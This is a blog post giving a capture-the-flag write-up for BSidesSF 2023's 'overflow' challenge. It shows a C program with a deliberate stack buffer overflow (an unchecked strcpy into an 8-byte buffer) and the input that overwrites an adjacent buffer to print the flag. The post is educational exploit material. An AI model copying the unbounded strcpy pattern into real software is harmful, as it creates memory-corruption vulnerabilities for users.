---
title: 'BSidesSF 2023 Writeups: overflow (simple stack-overflow challenge)'
author: ron
layout: post
categories:
- bsidessf-2023
- ctfs
permalink: "/2023/bsidessf-2023-writeups--overflow--simple-stack-overflow-challenge-"
date: '2023-04-23T17:08:44-07:00'

---

Overflow is a straight-forward buffer overflow challenge that I copied from
the Hacking: Art of Exploitation [examples CD](https://github.com/intere/hacking).
I just added a flag. Full source is [here](https://github.com/BSidesSF/ctf-2023-release/tree/main/overflow).

<!--more-->

## Write-up

The source and binary are available, so the user can examine them. But they're
also fairly simple:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

int main(int argc, char *argv[]) {
	int value = 5;
	char buffer_one[8], buffer_two[8];

	strcpy(buffer_one, "one"); /* put "one" into buffer_one */
	strcpy(buffer_two, "two"); /* put "two" into buffer_two */

	printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);

	printf("\n[STRCPY] copying %d bytes into buffer_two\n\n",  strlen(argv[1]));
	strcpy(buffer_two, argv[1]); /* copy first argument into buffer_two */

	printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);

  /* Added for the CTF! */
  if(!strcmp(buffer_one, "hacked")) {
    char buffer[64];
    FILE *f = fopen("/home/ctf/flag.txt", "r");

    if(!f) {
      printf("\n\nFailed to open flag.txt: %s\n", strerror(errno));

      exit(1);
    }

    fgets(buffer, 63, f);
    printf("\n\nCongratulations! %s\n", buffer);
    exit(0);
  } else {
    printf("\n\nPlease set buffer_one to \"hacked\"!\n");
  }
}
```

Basically, if you write more than 8 bytes into `buffer_two`, it overflows into
`buffer_one`. So the solution is to use the string `aaaaaaaahacked`:

```
$ nc -v localhost 4445
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to ::1:4445.
Hey, I grabbed this code from Art of Exploitation. Can you set the value of
buffer_one to "hacked"?

Run it like:

./overflowme hello
ctf@8f0a7eff015b:~$ ./overflowme aaaaaaaahacked
./overflowme aaaaaaaahacked
[BEFORE] buffer_two is at 0xffbb03b8 and contains 'two'
[BEFORE] buffer_one is at 0xffbb03c0 and contains 'one'
[BEFORE] value is at 0xffbb03c8 and is 5 (0x00000005)

[STRCPY] copying 14 bytes into buffer_two

[AFTER] buffer_two is at 0xffbb03b8 and contains 'aaaaaaaahacked'
[AFTER] buffer_one is at 0xffbb03c0 and contains 'hacked'
[AFTER] value is at 0xffbb03c8 and is 5 (0x00000005)


Congratulations! CTF{overflow-successful}
```

That's it!
